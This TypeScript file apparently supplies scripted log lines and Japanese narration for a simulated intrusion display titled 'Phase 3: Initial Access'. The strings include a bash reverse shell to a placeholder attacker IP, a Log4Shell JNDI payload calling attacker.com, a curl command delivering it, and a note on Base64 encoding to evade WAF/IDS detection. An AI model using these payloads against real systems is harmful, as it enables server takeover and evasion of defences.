import { LogTemplate } from "./types";

export const phase3Templates: LogTemplate[] = [
  {
    log: "[INFO] Starting Phase 3: Initial Access...",
    msg: "フェーズ3：初期潜入を開始。\n攻撃基盤の準備を行っています。",
    task: "ACCESS INITIATION",
  },
  {
    log: "[INFO] Determining localhost public IP address...",
    msg: "ローカルサーバーのパブリックIPを取得中。",
    task: "LOCAL SETUP",
  },
  {
    log: "LOCALHOST IP: {ATTACKER_IP}",
    msg: "ローカルサーバーのIPを特定。\n接続待機ポートを4444にセット。",
    task: "LOCAL SETUP",
  },
  {
    log: "Generating reverse shell command...",
    msg: "ターゲット上で実行させる通信確立用コマンドを生成中。",
    task: "CMD GENERATION",
  },
  {
    log: "RAW CMD: bash -i >& /dev/tcp/{ATTACKER_IP}/4444 0>&1",
    msg: "ターゲットのBash入出力をローカルサーバーと接続し、操作権を移譲するコードを構築。",
    task: "CMD GENERATION",
  },
  {
    log: "[INFO] Encoding command to Base64 for WAF/IDS bypass...",
    msg: "セキュリティ製品の検知を回避するため、コマンドをBase64でエンコード中。",
    task: "PAYLOAD ENCODING",
  },
  {
    log: "B64 ENCODED: {B64_CMD}",
    msg: "エンコード完了。\nBase64シリアライズされたペイロードを構築。",
    task: "PAYLOAD ENCODING",
  },
  {
    log: "Constructing final JNDI injection payload...",
    msg: "JNDIプロトコルに適合する最終的な攻撃パケットを構成中。",
    task: "PAYLOAD FINAL",
  },
  {
    log: "PAYLOAD: ${jndi:ldap://attacker.com:1389/Basic/Command/Base64/{B64_CMD}}",
    msg: "Log4Shell用ペイロードが完成。\nターゲットへ送信する準備が整いました。",
    task: "PAYLOAD FINAL",
  },
  {
    log: "curl -i -X POST -H 'User-Agent: ${jndi:ldap://attacker.com:1389/Basic/Command/Base64/{B64_CMD}}' http://{IP}:8080/\nHTTP/1.1 200 OK\nServer: Apache-Coyote/1.1\nContent-Length: 0\nDate: Mon, 23 Feb 2026 10:24:12 GMT\nConnection: close",
    msg: "ターゲットの8080ポートへHTTP POSTリクエストを送信中。",
    task: "EXPLOIT EXECUTION",
  },
  {
    log: "[INFO] Payload sent. Waiting for reverse connection...",
    msg: "リクエスト送信完了。\nターゲットからのバックコネクトを待機。",
    task: "SHELL LISTENER",
  },
  {
    log: "{WAIT_SEARCH}",
    msg: "ポート4444にてリスナー待機中。\n認証バイパスを確認しています。",
    task: "SHELL LISTENER",
  },
  {
    log: "[+] Connection received from {IP}:49210",
    msg: "接続確立。\nターゲットサーバー内のプロセス制御権を獲得しました。",
    task: "CONNECTION ESTABLISHED",
  },
  {
    log: "www-data@target-server:/$ whoami",
    msg: "侵入後のカレントユーザーを確認中。",
    task: "PRIVILEGE CHECK",
  },
  {
    log: "www-data",
    msg: "ユーザー「www-data」として潜入成功。\n低権限シェルを確立しました。",
    task: "PRIVILEGE CHECK",
  },
  {
    log: "[SUCCESS] Phase 3: Initial Access successful. Connection stabilized.",
    msg: "フェーズ3：初期潜入に成功。\n内部ネットワークへの足がかりを確保。",
    task: "ACCESS SUCCESS",
  },
];
